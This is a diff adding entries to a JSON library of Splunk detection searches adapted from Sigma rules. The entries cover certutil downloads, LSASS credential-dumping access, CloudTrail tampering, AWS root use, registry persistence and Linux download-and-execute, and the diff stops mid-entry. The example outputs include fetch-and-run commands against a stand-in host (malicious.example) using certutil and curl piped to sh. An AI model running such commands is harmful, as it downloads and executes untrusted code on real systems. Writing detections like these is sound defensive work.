@@ -71202,5 +71202,867 @@
     "created": "2026-08-03",
     "modified": "2026-08-03",
     "copyCount": 0
+  },
+  {
+    "id": "custom-sigma-certutil-download",
+    "title": "Suspicious File Download via Certutil.exe",
+    "summary": "Detects certutil.exe used with download-capable flags (urlcache, verifyctl, URL) alongside an http(s) argument — a well-known LOLBin download technique.",
+    "purpose": "certutil.exe is a signed Windows binary that can be abused to download remote files, bypassing some application allowlisting controls. This search implements the detection logic of the public Sigma rule \"Suspicious Download Via Certutil.EXE\" (id 19b08b1c-861d-4e75-a1ef-ea0c1baf202b), which flags certutil invocations combining a download-capable flag with an http(s) URL.",
+    "spl": "index=<windows_index> (sourcetype=XmlWinEventLog:Sysmon EventCode=1 OR sourcetype=WinEventLog:Security EventCode=4688)\n| eval Image=coalesce(Image, New_Process_Name)\n| eval CommandLine=coalesce(CommandLine, Process_Command_Line)\n| where (match(Image, \"(?i)\\\\certutil\\.exe$\") OR match(OriginalFileName, \"(?i)^CertUtil\\.exe$\"))\n    AND (match(CommandLine, \"(?i)urlcache \") OR match(CommandLine, \"(?i)verifyctl \") OR match(CommandLine, \"(?i)URL \"))\n    AND match(CommandLine, \"(?i)http\")\n| table _time host user Image CommandLine ParentImage\n| sort - _time",
+    "category": "Threat Detection",
+    "subcategory": "Living-off-the-Land Binaries",
+    "useCases": [
+      "Threat Detection",
+      "Investigation"
+    ],
+    "commands": [
+      "eval",
+      "where",
+      "table",
+      "sort"
+    ],
+    "platforms": [
+      "Windows"
+    ],
+    "products": [
+      "Splunk Enterprise Security"
+    ],
+    "dataSources": [
+      "Sysmon Event Logs",
+      "Windows Security Event Log"
+    ],
+    "indexes": [
+      "<windows_index>"
+    ],
+    "sourcetypes": [
+      "XmlWinEventLog:Sysmon",
+      "WinEventLog:Security"
+    ],
+    "requiredFields": [
+      "Image",
+      "CommandLine"
+    ],
+    "optionalFields": [
+      "OriginalFileName",
+      "ParentImage",
+      "user"
+    ],
+    "outputFields": [
+      "_time",
+      "host",
+      "user",
+      "Image",
+      "CommandLine",
+      "ParentImage"
+    ],
+    "cimDomains": [
+      "Endpoint"
+    ],
+    "dataModels": [
+      "Endpoint"
+    ],
+    "macros": [],
+    "lookups": [],
+    "tags": [
+      "sigma",
+      "lolbin",
+      "certutil",
+      "ingress-tool-transfer"
+    ],
+    "difficulty": "Intermediate",
+    "searchType": "Detection",
+    "explanationSteps": [
+      {
+        "stage": 1,
+        "spl": "index=<windows_index> (sourcetype=XmlWinEventLog:Sysmon EventCode=1 OR sourcetype=WinEventLog:Security EventCode=4688)",
+        "description": "Retrieves process creation events from either Sysmon or native Windows Security auditing, whichever this environment forwards."
+      },
+      {
+        "stage": 2,
+        "spl": "| eval Image=coalesce(Image, New_Process_Name) | eval CommandLine=coalesce(CommandLine, Process_Command_Line)",
+        "description": "Normalizes field names between the two possible sourcetypes."
+      },
+      {
+        "stage": 3,
+        "spl": "| where (match(Image, \"(?i)\\\\certutil\\.exe$\") OR match(OriginalFileName, \"(?i)^CertUtil\\.exe$\")) AND (match(CommandLine, \"(?i)urlcache \") OR match(CommandLine, \"(?i)verifyctl \") OR match(CommandLine, \"(?i)URL \")) AND match(CommandLine, \"(?i)http\")",
+        "description": "Reproduces the Sigma rule's three conditions: the process is certutil.exe, the command line uses a download-capable flag, and it references an http(s) URL."
+      }
+    ],
+    "exampleOutput": [
+      {
+        "_time": "2026-08-03 14:02:11",
+        "host": "WKSTN-22",
+        "user": "jdoe",
+        "Image": "C:\\Windows\\System32\\certutil.exe",
+        "CommandLine": "certutil.exe -urlcache -split -f http://malicious.example/payload.exe",
+        "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+      }
+    ],
+    "customisationNotes": [
+      "Replace <windows_index> with your Windows index.",
+      "Requires either Sysmon (EventCode 1) or native process-creation auditing (Security EventCode 4688 with command-line logging enabled) — command-line logging is not on by default.",
+      "Detection logic adapted from the public Sigma rule \"Suspicious Download Via Certutil.EXE\" (SigmaHQ, id 19b08b1c-861d-4e75-a1ef-ea0c1baf202b), authored by Florian Roth (Nextron Systems), Jonhnathan Ribeiro, oscd.community, and Nasreddine Bencherchali (Nextron Systems), licensed under the Detection Rule License (DRL) 1.1. This SPL is an independent implementation of that rule's logic, not a copy of its YAML."
+    ],
+    "performanceNotes": [
+      "Filtering on EventCode before the regex matches keeps this reasonably efficient; still restrict the time range in production."
+    ],
+    "prerequisites": [
+      "Sysmon or Windows process-creation auditing with command-line logging enabled"
+    ],
+    "attack": {
+      "tactics": [
+        "Command and Control",
+        "Defense Evasion"
+      ],
+      "techniques": [
+        "T1105",
+        "T1218"
+      ]
+    },
+    "detection": {
+      "analyticType": "TTP",
+      "riskObjects": [
+        "Image",
+        "host"
+      ],
+      "falsePositives": [
+        "Legitimate administrative use of certutil to retrieve certificates in constrained environments — baseline expected hosts/scripts that use this flag combination."
+      ],
+      "investigationSteps": [
+        "Identify the parent process that launched certutil.",
+        "Determine what was downloaded and whether it executed."
+      ],
+      "drilldowns": [
+        "Search for subsequent process creation from the downloaded file path."
+      ]
+    },
+    "references": [
+      {
+        "label": "Sigma rule: Suspicious Download Via Certutil.EXE (SigmaHQ)",
+        "url": "id 19b08b1c-861d-4e75-a1ef-ea0c1baf202b — authors Florian Roth (Nextron Systems), Jonhnathan Ribeiro, oscd.community, Nasreddine Bencherchali (Nextron Systems); Detection Rule License 1.1"
+      },
+      {
+        "label": "LOLBAS Project: Certutil",
+        "url": "https://lolbas-project.github.io/lolbas/Binaries/Certutil/"
+      }
+    ],
+    "relatedEntryIds": [],
+    "validationStatus": "Reviewed",
+    "sourceType": "custom",
+    "author": "SPL Library Team (SPL logic derived from a public Sigma rule; see references)",
+    "version": "1.0",
+    "created": "2026-08-03",
+    "modified": "2026-08-03",
+    "copyCount": 0
+  },
+  {
+    "id": "custom-sigma-lsass-suspicious-access",
+    "title": "Suspicious GrantedAccess Flags on LSASS (Credential Dumping)",
+    "summary": "Flags process access to lsass.exe with GrantedAccess flags commonly associated with credential-dumping tools, excluding known-legitimate security products.",
+    "purpose": "Tools that dump credentials from LSASS memory (a common precursor to Pass-the-Hash and lateral movement) request specific, unusually broad access rights when opening a handle to lsass.exe. This search implements the detection logic of the public Sigma rule \"Potentially Suspicious GrantedAccess Flags On LSASS\" (id a18dd26b-6450-46de-8c91-9659150cf088), which flags a curated set of suspicious GrantedAccess hex values while excluding known-legitimate security tooling.",
+    "spl": "index=<windows_index> sourcetype=XmlWinEventLog:Sysmon EventCode=10 TargetImage=\"*\\lsass.exe\"\n| where GrantedAccess IN (\"0x1010\", \"0x1038\", \"0x1400\", \"0x1410\", \"0x1418\", \"0x1438\", \"0x143a\", \"0x1fffff\", \"0x1f0fff\", \"0x1f1fff\", \"0x1f2fff\", \"0x1f3fff\")\n| eval accessing_process=coalesce(SourceImage, Image)\n| where NOT match(accessing_process, \"(?i)\\\\(MsMpEng\\.exe|MsSense\\.exe|SenseIR\\.exe|procexp\\d*\\.exe|procmon\\d*\\.exe|WerFault\\.exe)$\")\n| stats count values(GrantedAccess) AS access_flags earliest(_time) AS first_seen latest(_time) AS last_seen BY accessing_process, host\n| convert ctime(first_seen) ctime(last_seen)\n| sort - count",
+    "category": "Threat Detection",
+    "subcategory": "Credential Access",
+    "useCases": [
+      "Threat Detection",
+      "Investigation"
+    ],
+    "commands": [
+      "where",
+      "eval",
+      "stats",
+      "convert",
+      "sort"
+    ],
+    "platforms": [
+      "Windows"
+    ],
+    "products": [
+      "Splunk Enterprise Security"
+    ],
+    "dataSources": [
+      "Sysmon Event Logs"
+    ],
+    "indexes": [
+      "<windows_index>"
+    ],
+    "sourcetypes": [
+      "XmlWinEventLog:Sysmon"
+    ],
+    "requiredFields": [
+      "EventCode",
+      "TargetImage",
+      "GrantedAccess"
+    ],
+    "optionalFields": [
+      "SourceImage",
+      "Image"
+    ],
+    "outputFields": [
+      "accessing_process",
+      "host",
+      "count",
+      "access_flags",
+      "first_seen",
+      "last_seen"
+    ],
+    "cimDomains": [
+      "Endpoint"
+    ],
+    "dataModels": [],
+    "macros": [],
+    "lookups": [],
+    "tags": [
+      "sigma",
+      "lsass",
+      "credential-dumping",
+      "process-access"
+    ],
+    "difficulty": "Advanced",
+    "searchType": "Detection",
+    "explanationSteps": [
+      {
+        "stage": 1,
+        "spl": "index=<windows_index> sourcetype=XmlWinEventLog:Sysmon EventCode=10 TargetImage=\"*\\lsass.exe\"",
+        "description": "Retrieves Sysmon ProcessAccess events (EventCode 10) where the target of the access is lsass.exe."
+      },
+      {
+        "stage": 2,
+        "spl": "| where GrantedAccess IN (\"0x1010\", \"0x1038\", \"0x1400\", \"0x1410\", \"0x1418\", \"0x1438\", \"0x143a\", \"0x1fffff\", \"0x1f0fff\", \"0x1f1fff\", \"0x1f2fff\", \"0x1f3fff\")",
+        "description": "Keeps only events where the requested access rights match a curated list of flag combinations commonly used by credential-dumping tools."
+      },
+      {
+        "stage": 3,
+        "spl": "| eval accessing_process=coalesce(SourceImage, Image) | where NOT match(accessing_process, \"(?i)\\\\(MsMpEng\\.exe|MsSense\\.exe|SenseIR\\.exe|procexp\\d*\\.exe|procmon\\d*\\.exe|WerFault\\.exe)$\")",
+        "description": "Excludes well-known, legitimate processes (antivirus, EDR, Sysinternals, Windows Error Reporting) that routinely access LSASS with broad rights."
+      },
+      {
+        "stage": 4,
+        "spl": "| stats count values(GrantedAccess) AS access_flags earliest(_time) AS first_seen latest(_time) AS last_seen BY accessing_process, host",
+        "description": "Summarizes remaining suspicious access events by the accessing process and host."
+      }
+    ],
+    "exampleOutput": [
+      {
+        "accessing_process": "C:\\Users\\Public\\tool.exe",
+        "host": "WKSTN-11",
+        "count": "1",
+        "access_flags": "0x1fffff",
+        "first_seen": "2026-08-02 03:14:02",
+        "last_seen": "2026-08-02 03:14:02"
+      }
+    ],
+    "customisationNotes": [
+      "Replace <windows_index> with your Windows index.",
+      "The excluded process list is a starting point — extend it with your own EDR/AV process names to avoid re-alerting on known-legitimate tooling in your environment.",
+      "Detection logic adapted from the public Sigma rule \"Potentially Suspicious GrantedAccess Flags On LSASS\" (SigmaHQ, id a18dd26b-6450-46de-8c91-9659150cf088), authored by Florian Roth, Roberto Rodriguez, Dimitrios Slamaris, Mark Russinovich, Thomas Patzke, Teymur Kheirkhabarov, Sherif Eldeeb, James Dickenson, Aleksey Potapov, and oscd.community, licensed under the Detection Rule License (DRL) 1.1. This SPL is an independent implementation of that rule's logic, not a copy of its YAML."
+    ],
+    "performanceNotes": [
+      "Sysmon EventCode 10 (ProcessAccess) can be high-volume — this rule already narrows to TargetImage=lsass.exe first, which keeps volume manageable on most endpoints."
+    ],
+    "prerequisites": [
+      "Sysmon installed with a configuration that logs ProcessAccess (EventCode 10) events for lsass.exe"
+    ],
+    "attack": {
+      "tactics": [
+        "Credential Access"
+      ],
+      "techniques": [
+        "T1003.001"
+      ]
+    },
+    "detection": {
+      "analyticType": "TTP",
+      "riskObjects": [
+        "accessing_process",
+        "host"
+      ],
+      "falsePositives": [
+        "Security products and diagnostic tools not yet added to the exclusion list will trigger this — tune the exclusion list before relying on this as a high-fidelity alert."
+      ],
+      "investigationSteps": [
+        "Confirm whether the accessing process is a recognized, authorized tool.",
+        "If unrecognized, isolate the host and treat as probable credential theft."
+      ],
+      "drilldowns": [
+        "Search for follow-on lateral movement (NTLM network logons, new sessions) using credentials from the affected host."
+      ]
+    },
+    "references": [
+      {
+        "label": "Sigma rule: Potentially Suspicious GrantedAccess Flags On LSASS (SigmaHQ)",
+        "url": "id a18dd26b-6450-46de-8c91-9659150cf088 — authors Florian Roth, Roberto Rodriguez, Dimitrios Slamaris, Mark Russinovich, Thomas Patzke, Teymur Kheirkhabarov, Sherif Eldeeb, James Dickenson, Aleksey Potapov, oscd.community; Detection Rule License 1.1"
+      }
+    ],
+    "relatedEntryIds": [
+      "custom-authored-pass-the-hash-ntlm"
+    ],
+    "validationStatus": "Reviewed",
+    "sourceType": "custom",
+    "author": "SPL Library Team (SPL logic derived from a public Sigma rule; see references)",
+    "version": "1.0",
+    "created": "2026-08-03",
+    "modified": "2026-08-03",
+    "copyCount": 0
+  },
+  {
+    "id": "custom-sigma-aws-cloudtrail-tamper",
+    "title": "AWS CloudTrail Logging Disabled, Updated, or Deleted",
+    "summary": "Flags StopLogging, UpdateTrail, and DeleteTrail CloudTrail management events — a common defense-evasion step before other malicious activity.",
+    "purpose": "Disabling or altering CloudTrail is a classic way for an attacker (or a misconfigured automation) to blind logging before further action. This search implements the detection logic of the public Sigma rule \"AWS CloudTrail Important Change\" (id 4db60cc0-36fb-42b7-9b58-a5b53019fb74), which flags the StopLogging, UpdateTrail, and DeleteTrail management events.",
+    "spl": "index=<cloudtrail_index> sourcetype=aws:cloudtrail eventSource=\"cloudtrail.amazonaws.com\"\n| search eventName IN (\"StopLogging\", \"UpdateTrail\", \"DeleteTrail\")\n| table _time eventName userIdentity.arn userIdentity.type sourceIPAddress requestParameters.name awsRegion\n| sort - _time",
+    "category": "Threat Detection",
+    "subcategory": "Cloud Defense Evasion",
+    "useCases": [
+      "Threat Detection",
+      "Investigation"
+    ],
+    "commands": [
+      "search",
+      "table",
+      "sort"
+    ],
+    "platforms": [
+      "Cloud",
+      "AWS"
+    ],
+    "products": [
+      "Splunk Enterprise Security",
+      "Splunk Cloud Platform"
+    ],
+    "dataSources": [
+      "AWS CloudTrail"
+    ],
+    "indexes": [
+      "<cloudtrail_index>"
+    ],
+    "sourcetypes": [
+      "aws:cloudtrail"
+    ],
+    "requiredFields": [
+      "eventSource",
+      "eventName"
+    ],
+    "optionalFields": [
+      "userIdentity.arn",
+      "userIdentity.type",
+      "sourceIPAddress",
+      "requestParameters.name",
+      "awsRegion"
+    ],
+    "outputFields": [
+      "_time",
+      "eventName",
+      "userIdentity.arn",
+      "userIdentity.type",
+      "sourceIPAddress",
+      "requestParameters.name",
+      "awsRegion"
+    ],
+    "cimDomains": [
+      "Change"
+    ],
+    "dataModels": [],
+    "macros": [],
+    "lookups": [],
+    "tags": [
+      "sigma",
+      "aws",
+      "cloudtrail",
+      "defense-evasion",
+      "logging-tamper"
+    ],
+    "difficulty": "Beginner",
+    "searchType": "Detection",
+    "explanationSteps": [
+      {
+        "stage": 1,
+        "spl": "index=<cloudtrail_index> sourcetype=aws:cloudtrail eventSource=\"cloudtrail.amazonaws.com\"",
+        "description": "Retrieves CloudTrail management events specifically for the CloudTrail service itself."
+      },
+      {
+        "stage": 2,
+        "spl": "| search eventName IN (\"StopLogging\", \"UpdateTrail\", \"DeleteTrail\")",
+        "description": "Keeps only the three event names that indicate a trail was disabled, modified, or removed."
+      }
+    ],
+    "exampleOutput": [
+      {
+        "_time": "2026-08-02 22:10:04",
+        "eventName": "StopLogging",
+        "userIdentity.arn": "arn:aws:iam::123456789012:user/contractor1",
+        "userIdentity.type": "IAMUser",
+        "sourceIPAddress": "198.51.100.20",
+        "requestParameters.name": "org-trail",
+        "awsRegion": "us-east-1"
+      }
+    ],
+    "customisationNotes": [
+      "Replace <cloudtrail_index> with your CloudTrail index.",
+      "Detection logic adapted from the public Sigma rule \"AWS CloudTrail Important Change\" (SigmaHQ, id 4db60cc0-36fb-42b7-9b58-a5b53019fb74), authored by vitaliy0x1, licensed under the Detection Rule License (DRL) 1.1. This SPL is an independent implementation of that rule's logic, not a copy of its YAML.",
+      "Any hit on this search warrants immediate review — legitimate trail configuration changes are rare and usually performed by a small set of known automation roles."
+    ],
+    "performanceNotes": [
+      "Inexpensive — filters on two indexed-ish fields before returning a small result set."
+    ],
+    "prerequisites": [
+      "AWS CloudTrail configured to log management events, ingested into Splunk"
+    ],
+    "attack": {
+      "tactics": [
+        "Defense Evasion"
+      ],
+      "techniques": [
+        "T1562.008"
+      ]
+    },
+    "detection": {
+      "analyticType": "TTP",
+      "riskObjects": [
+        "userIdentity.arn"
+      ],
+      "falsePositives": [
+        "Legitimate infrastructure-as-code changes to trail configuration (e.g. adding a new region) — maintain an allowlist of expected automation roles/users."
+      ],
+      "investigationSteps": [
+        "Confirm whether the identity making the change is an expected administrator or automation role.",
+        "Check what other API activity occurred from the same identity/source IP immediately before and after."
+      ],
+      "drilldowns": [
+        "Pull all CloudTrail activity from the same userIdentity.arn and sourceIPAddress in the surrounding hour."
+      ]
+    },
+    "references": [
+      {
+        "label": "Sigma rule: AWS CloudTrail Important Change (SigmaHQ)",
+        "url": "id 4db60cc0-36fb-42b7-9b58-a5b53019fb74 — author vitaliy0x1; Detection Rule License 1.1"
+      }
+    ],
+    "relatedEntryIds": [
+      "custom-sigma-aws-root-account-usage"
+    ],
+    "validationStatus": "Reviewed",
+    "sourceType": "custom",
+    "author": "SPL Library Team (SPL logic derived from a public Sigma rule; see references)",
+    "version": "1.0",
+    "created": "2026-08-03",
+    "modified": "2026-08-03",
+    "copyCount": 0
+  },
+  {
+    "id": "custom-sigma-aws-root-account-usage",
+    "title": "AWS Root Account Usage",
+    "summary": "Flags any non-service-event CloudTrail activity performed by the AWS account root user — root should almost never be used day to day.",
+    "purpose": "AWS best practice is to avoid using the root account for routine operations. This search implements the detection logic of the public Sigma rule \"AWS Root Credentials\" (id 8ad1600d-e9dc-4251-b0ee-a65268f29add), which flags CloudTrail events where the identity type is Root and the event was not an internal AWS service event.",
+    "spl": "index=<cloudtrail_index> sourcetype=aws:cloudtrail userIdentity.type=Root\n| where eventType!=\"AwsServiceEvent\"\n| table _time eventName eventSource sourceIPAddress userAgent awsRegion userIdentity.accountId\n| sort - _time",
+    "category": "Threat Detection",
+    "subcategory": "Cloud Privilege Escalation",
+    "useCases": [
+      "Threat Detection",
+      "Investigation"
+    ],
+    "commands": [
+      "where",
+      "table",
+      "sort"
+    ],
+    "platforms": [
+      "Cloud",
+      "AWS"
+    ],
+    "products": [
+      "Splunk Enterprise Security",
+      "Splunk Cloud Platform"
+    ],
+    "dataSources": [
+      "AWS CloudTrail"
+    ],
+    "indexes": [
+      "<cloudtrail_index>"
+    ],
+    "sourcetypes": [
+      "aws:cloudtrail"
+    ],
+    "requiredFields": [
+      "userIdentity.type",
+      "eventType"
+    ],
+    "optionalFields": [
+      "eventName",
+      "eventSource",
+      "sourceIPAddress",
+      "userAgent",
+      "awsRegion"
+    ],
+    "outputFields": [
+      "_time",
+      "eventName",
+      "eventSource",
+      "sourceIPAddress",
+      "userAgent",
+      "awsRegion",
+      "userIdentity.accountId"
+    ],
+    "cimDomains": [
+      "Authentication"
+    ],
+    "dataModels": [],
+    "macros": [],
+    "lookups": [],
+    "tags": [
+      "sigma",
+      "aws",
+      "root-account",
+      "privilege-escalation"
+    ],
+    "difficulty": "Beginner",
+    "searchType": "Detection",
+    "explanationSteps": [
+      {
+        "stage": 1,
+        "spl": "index=<cloudtrail_index> sourcetype=aws:cloudtrail userIdentity.type=Root",
+        "description": "Retrieves CloudTrail events where the acting identity is the account root user."
+      },
+      {
+        "stage": 2,
+        "spl": "| where eventType!=\"AwsServiceEvent\"",
+        "description": "Excludes internal AWS service-generated events that are attributed to root but don't represent actual root user activity."
+      }
+    ],
+    "exampleOutput": [
+      {
+        "_time": "2026-08-01 03:44:19",
+        "eventName": "ConsoleLogin",
+        "eventSource": "signin.amazonaws.com",
+        "sourceIPAddress": "203.0.113.9",
+        "userAgent": "Mozilla/5.0",
+        "awsRegion": "us-east-1",
+        "userIdentity.accountId": "123456789012"
+      }
+    ],
+    "customisationNotes": [
+      "Replace <cloudtrail_index> with your CloudTrail index.",
+      "Detection logic adapted from the public Sigma rule \"AWS Root Credentials\" (SigmaHQ, id 8ad1600d-e9dc-4251-b0ee-a65268f29add), authored by vitaliy0x1, licensed under the Detection Rule License (DRL) 1.1. This SPL is an independent implementation of that rule's logic, not a copy of its YAML.",
+      "If root use is expected for a specific break-glass procedure, note the expected time window and requestor so hits outside that window stand out."
+    ],
+    "performanceNotes": [
+      "Inexpensive — filters on the userIdentity.type field before returning results."
+    ],
+    "prerequisites": [
+      "AWS CloudTrail configured to log management events, ingested into Splunk"
+    ],
+    "attack": {
+      "tactics": [
+        "Privilege Escalation",
+        "Initial Access",
+        "Persistence"
+      ],
+      "techniques": [
+        "T1078.004"
+      ]
+    },
+    "detection": {
+      "analyticType": "TTP",
+      "riskObjects": [
+        "userIdentity.accountId",
+        "sourceIPAddress"
+      ],
+      "falsePositives": [
+        "Legitimate, rare break-glass root usage for account-level operations that can only be performed by root (e.g. closing an account) will also match — cross-reference against a change ticket or break-glass log."
+      ],
+      "investigationSteps": [
+        "Confirm whether root usage was pre-approved.",
+        "Check the source IP and user agent against expected break-glass access patterns."
+      ],
+      "drilldowns": [
+        "Pull all API activity from the same source IP address across the account in the surrounding period."
+      ]
+    },
+    "references": [
+      {
+        "label": "Sigma rule: AWS Root Credentials (SigmaHQ)",
+        "url": "id 8ad1600d-e9dc-4251-b0ee-a65268f29add — author vitaliy0x1; Detection Rule License 1.1"
+      }
+    ],
+    "relatedEntryIds": [
+      "custom-sigma-aws-cloudtrail-tamper"
+    ],
+    "validationStatus": "Reviewed",
+    "sourceType": "custom",
+    "author": "SPL Library Team (SPL logic derived from a public Sigma rule; see references)",
+    "version": "1.0",
+    "created": "2026-08-03",
+    "modified": "2026-08-03",
+    "copyCount": 0
+  },
+  {
+    "id": "custom-sigma-registry-dbgmanageddebugger",
+    "title": "Registry Persistence via DbgManagedDebugger",
+    "summary": "Detects a value written to the .NETFramework DbgManagedDebugger registry key outside the legitimate Visual Studio JIT debugger pattern — a known persistence trick.",
+    "purpose": "The DbgManagedDebugger registry value normally points to the Visual Studio JIT debugger and is invoked automatically when a .NET application crashes. Pointing it at attacker-controlled code is a low-visibility persistence technique. This search implements the detection logic of the public Sigma rule \"Potential Registry Persistence Attempt Via DbgManagedDebugger\" (id 9827ae57-3802-418f-994b-d5ecf5cd974b), which flags any value set on this key that doesn't match the standard Visual Studio debugger invocation.",
+    "spl": "index=<windows_index> sourcetype=XmlWinEventLog:Sysmon EventCode=13 TargetObject=\"*\\Microsoft\\.NETFramework\\DbgManagedDebugger\"\n| where NOT match(Details, \"(?i)^\\\"C:\\\\Windows\\\\system32\\\\vsjitdebugger\\.exe\\\"\")\n| table _time host Image TargetObject Details\n| sort - _time",
+    "category": "Threat Detection",
+    "subcategory": "Persistence",
+    "useCases": [
+      "Threat Detection",
+      "Investigation"
+    ],
+    "commands": [
+      "where",
+      "table",
+      "sort"
+    ],
+    "platforms": [
+      "Windows"
+    ],
+    "products": [
+      "Splunk Enterprise Security"
+    ],
+    "dataSources": [
+      "Sysmon Event Logs"
+    ],
+    "indexes": [
+      "<windows_index>"
+    ],
+    "sourcetypes": [
+      "XmlWinEventLog:Sysmon"
+    ],
+    "requiredFields": [
+      "EventCode",
+      "TargetObject",
+      "Details"
+    ],
+    "optionalFields": [
+      "Image"
+    ],
+    "outputFields": [
+      "_time",
+      "host",
+      "Image",
+      "TargetObject",
+      "Details"
+    ],
+    "cimDomains": [],
+    "dataModels": [],
+    "macros": [],
+    "lookups": [],
+    "tags": [
+      "sigma",
+      "registry-persistence",
+      "ifeo",
+      "debugger-hijack"
+    ],
+    "difficulty": "Intermediate",
+    "searchType": "Detection",
+    "explanationSteps": [
+      {
+        "stage": 1,
+        "spl": "index=<windows_index> sourcetype=XmlWinEventLog:Sysmon EventCode=13 TargetObject=\"*\\Microsoft\\.NETFramework\\DbgManagedDebugger\"",
+        "description": "Retrieves Sysmon registry value-set events (EventCode 13) targeting the DbgManagedDebugger key."
+      },
+      {
+        "stage": 2,
+        "spl": "| where NOT match(Details, \"(?i)^\\\"C:\\\\Windows\\\\system32\\\\vsjitdebugger\\.exe\\\"\")",
+        "description": "Excludes the standard, legitimate value that points to the built-in Visual Studio JIT debugger, leaving only unexpected values."
+      }
+    ],
+    "exampleOutput": [
+      {
+        "_time": "2026-08-02 19:00:33",
+        "host": "WKSTN-05",
+        "Image": "C:\\Windows\\System32\\reg.exe",
+        "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\.NETFramework\\DbgManagedDebugger",
+        "Details": "C:\\Users\\Public\\payload.exe"
+      }
+    ],
+    "customisationNotes": [
+      "Replace <windows_index> with your Windows index.",
+      "Detection logic adapted from the public Sigma rule \"Potential Registry Persistence Attempt Via DbgManagedDebugger\" (SigmaHQ, id 9827ae57-3802-418f-994b-d5ecf5cd974b), authored by frack113, licensed under the Detection Rule License (DRL) 1.1. This SPL is an independent implementation of that rule's logic, not a copy of its YAML."
+    ],
+    "performanceNotes": [
+      "Very inexpensive — a specific TargetObject filter combined with a single exclusion regex."
+    ],
+    "prerequisites": [
+      "Sysmon installed with registry event logging (EventCode 13) enabled"
+    ],
+    "attack": {
+      "tactics": [
+        "Persistence",
+        "Privilege Escalation"
+      ],
+      "techniques": [
+        "T1546.012"
+      ]
+    },
+    "detection": {
+      "analyticType": "TTP",
+      "riskObjects": [
+        "host",
+        "Image"
+      ],
+      "falsePositives": [
+        "Non-standard but legitimate .NET debugging tooling configured by developers on workstations — verify with the owning team before treating as malicious."
+      ],
+      "investigationSteps": [
+        "Identify what process set the registry value.",
+        "Determine whether the referenced executable exists and what it does."
+      ],
+      "drilldowns": [
+        "Search for crashes of .NET applications on the same host following the registry change, which would trigger the hijacked debugger."
+      ]
+    },
+    "references": [
+      {
+        "label": "Sigma rule: Potential Registry Persistence Attempt Via DbgManagedDebugger (SigmaHQ)",
+        "url": "id 9827ae57-3802-418f-994b-d5ecf5cd974b — author frack113; Detection Rule License 1.1"
+      }
+    ],
+    "relatedEntryIds": [],
+    "validationStatus": "Reviewed",
+    "sourceType": "custom",
+    "author": "SPL Library Team (SPL logic derived from a public Sigma rule; see references)",
+    "version": "1.0",
+    "created": "2026-08-03",
+    "modified": "2026-08-03",
+    "copyCount": 0
+  },
+  {
+    "id": "custom-sigma-linux-curl-wget-exec-tmp",
+    "title": "Linux Download-and-Execute Pattern via Curl/Wget",
+    "summary": "Detects curl or wget downloading into /tmp or /dev/shm combined with a shell execution invocation on the same command line — a common fileless-attack pattern.",
+    "purpose": "A frequent Linux compromise pattern is downloading a script or binary into a world-writable temporary directory and immediately executing it via a shell, all on one command line. This search implements the detection logic of the public Sigma rule \"Suspicious Download and Execute Pattern via Curl/Wget\" (id a2d9e2f3-0f43-4c7a-bcd9-9acfc0d723aa), which requires all three of a downloader, a temp-directory path, and a shell invocation to appear together.",
+    "spl": "index=<linux_index> sourcetype=linux:audit type=EXECVE\n| eval CommandLine=mvjoin(mvappend(a0,a1,a2,a3,a4,a5,a6,a7), \" \")\n| where (match(CommandLine, \"(?i)/curl\") OR match(CommandLine, \"(?i)/wget\"))\n    AND (match(CommandLine, \"(?i)/tmp/\") OR match(CommandLine, \"(?i)/dev/shm/\"))\n    AND match(CommandLine, \"(?i)sh -c\")\n| table _time host CommandLine\n| sort - _time",
+    "category": "Threat Detection",
+    "subcategory": "Execution",
+    "useCases": [
+      "Threat Detection",
+      "Investigation"
+    ],
+    "commands": [
+      "eval",
+      "where",
+      "table",
+      "sort"
+    ],
+    "platforms": [
+      "Linux"
+    ],
+    "products": [
+      "Splunk Enterprise Security"
+    ],
+    "dataSources": [
+      "Linux Auditd Logs"
+    ],
+    "indexes": [
+      "<linux_index>"
+    ],
+    "sourcetypes": [
+      "linux:audit"
+    ],
+    "requiredFields": [
+      "type"
+    ],
+    "optionalFields": [
+      "a0",
+      "a1",
+      "a2",
+      "a3",
+      "a4",
+      "a5",
+      "a6",
+      "a7"
+    ],
+    "outputFields": [
+      "_time",
+      "host",
+      "CommandLine"
+    ],
+    "cimDomains": [
+      "Endpoint"
+    ],
+    "dataModels": [],
+    "macros": [],
+    "lookups": [],
+    "tags": [
+      "sigma",
+      "linux",
+      "fileless-attack",
+      "download-execute"
+    ],
+    "difficulty": "Intermediate",
+    "searchType": "Detection",
+    "explanationSteps": [
+      {
+        "stage": 1,
+        "spl": "index=<linux_index> sourcetype=linux:audit type=EXECVE",
+        "description": "Retrieves auditd EXECVE records, which log the full argument list of executed commands."
+      },
+      {
+        "stage": 2,
+        "spl": "| eval CommandLine=mvjoin(mvappend(a0,a1,a2,a3,a4,a5,a6,a7), \" \")",
+        "description": "Reassembles the individual a0..a7 argument fields auditd logs separately back into a single command-line string."
+      },
+      {
+        "stage": 3,
+        "spl": "| where (match(CommandLine, \"(?i)/curl\") OR match(CommandLine, \"(?i)/wget\")) AND (match(CommandLine, \"(?i)/tmp/\") OR match(CommandLine, \"(?i)/dev/shm/\")) AND match(CommandLine, \"(?i)sh -c\")",
+        "description": "Requires all three indicators together: a downloader tool, a temp/shared-memory path, and a shell execution invocation."
+      }
+    ],
+    "exampleOutput": [
+      {
+        "_time": "2026-08-02 11:22:09",
+        "host": "web03",
+        "CommandLine": "/bin/sh -c curl -s http://malicious.example/stage2.sh -o /tmp/.x && sh /tmp/.x"
+      }
+    ],
+    "customisationNotes": [
+      "Replace <linux_index> with your Linux index; adjust the sourcetype if your environment uses a different auditd add-on's field naming (e.g. a pre-joined CommandLine field instead of a0..a7).",
+      "Detection logic adapted from the public Sigma rule \"Suspicious Download and Execute Pattern via Curl/Wget\" (SigmaHQ, id a2d9e2f3-0f43-4c7a-bcd9-9acfc0d723aa), authored by Aayush Gupta, licensed under the Detection Rule License (DRL) 1.1. This SPL is an independent implementation of that rule's logic, not a copy of its YAML."
+    ],
+    "performanceNotes": [
+      "auditd EXECVE volume can be high on busy hosts — restrict the time range and consider pre-filtering on curl/wget in the base search if your sourcetype supports indexed field extraction on a0."
+    ],
+    "prerequisites": [
+      "Linux auditd configured to log execve syscalls, ingested into Splunk"
+    ],
+    "attack": {
+      "tactics": [
+        "Execution"
+      ],
+      "techniques": [
+        "T1059.004",
+        "T1105"
+      ]
+    },
+    "detection": {
+      "analyticType": "TTP",
+      "riskObjects": [
